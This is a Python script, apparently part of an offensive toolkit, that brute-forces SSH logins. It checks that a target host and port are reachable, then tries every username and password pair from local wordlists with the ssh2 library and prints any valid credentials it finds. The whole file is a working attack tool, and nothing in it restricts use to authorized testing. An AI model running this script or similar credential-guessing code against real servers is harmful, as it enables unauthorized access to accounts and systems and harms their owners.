#!/usr/bin/env python3
import sys
import socket
from ssh2.session import Session


def check_ssh_connection(ip_address, port):
    """Check if the SSH server is reachable."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((ip_address, int(port)))
        sock.close()
        print(f"[+] SSH server is reachable at {ip_address}:{port}")
        return True
    except (socket.error, socket.timeout) as e:
        print(f"[-] SSH connection failed: {e}")
        return False


def brute_force_ssh(ip_address, port, user_list_path, password_list_path):
    """Perform brute force SSH login using user and password lists."""
    print("[+] Starting SSH brute force attack...")

    try:
        with open(user_list_path, 'r') as user_file:
            user_list = [line.strip() for line in user_file if not line.startswith("#") and line.strip()]
    except FileNotFoundError:
        print(f"[-] User list file not found: {user_list_path}")
        return

    try:
        with open(password_list_path, 'r') as password_file:
            password_list = [line.strip() for line in password_file if not line.startswith("#") and line.strip()]
    except FileNotFoundError:
        print(f"[-] Password list file not found: {password_list_path}")
        return

    # Iterate through user and password combinations
    for user in user_list:
        for password in password_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((ip_address, int(port)))

                # Create SSH session using ssh2
                session = Session()
                session.set_timeout(10)
                session.set_socket(sock)

                # Try to authenticate with username and password
                try:
                    session.userauth_password(user, password)
                    if session.authenticated():
                        print(f"[+] Valid SSH credentials found - User: {user} | Password: {password}")
                        return  # Stop after finding valid credentials
                    else:
                        print(f"[-] Invalid credentials for User: {user} | Password: {password}")
                except Exception as e:
                    print(f"[-] Authentication failed for {user}:{password} - {e}")

                sock.close()
            except Exception as e:
                print(f"[-] Error occurred during connection: {e}")
                continue

    print("[-] Brute force attack failed. No valid SSH credentials found.")


def main():
    if len(sys.argv) != 3:
        print("Usage: python3 brute_ssh.py <ip address> <port>")
        sys.exit(1)

    ip_address = sys.argv[1].strip()
    port = sys.argv[2].strip()

    user_list_path = "modules/wordlists/usernames.txt"
    password_list_path = "modules/wordlists/ssh_passwd.txt"

    # Check if SSH server is reachable
    if not check_ssh_connection(ip_address, port):
        return

    # Perform brute force SSH login
    brute_force_ssh(ip_address, port, user_list_path, password_list_path)


if __name__ == "__main__":
    main()